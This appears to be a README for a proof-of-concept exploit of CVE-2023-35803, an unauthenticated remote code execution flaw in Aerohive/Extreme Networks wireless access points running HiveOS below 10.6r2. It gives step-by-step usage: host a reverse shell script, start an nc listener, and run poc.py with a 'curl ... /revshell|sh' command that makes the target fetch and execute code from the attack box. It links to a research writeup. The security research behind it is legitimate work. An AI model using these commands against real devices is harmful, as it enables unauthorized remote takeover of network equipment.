## CVE-2023-35803 - Unauthenticated RCE in Extreme Networks/Aerohive Wireless Access Points

PoC for ARM-based access points running HiveOS/IQ Engine <10.6r2.

1. Edit `revshell` to point to your shell catcher IP/port
2. Host the reverse shell: `python3 -m http.server`
3. Open a shell catcher: `nc -lvnp 1337`
4. Run the POC (may take a few minutes): `python3 poc.py <ip of ap> "curl <ip of attack box>:8000/revshell|sh"`

---

Writeup here: [https://research.aurainfosec.io/pentest/bee-yond-capacity/](https://research.aurainfosec.io/pentest/bee-yond-capacity/)

<img src="https://research.aurainfosec.io/pentest/bee-yond-capacity/featured.png" width=250 />
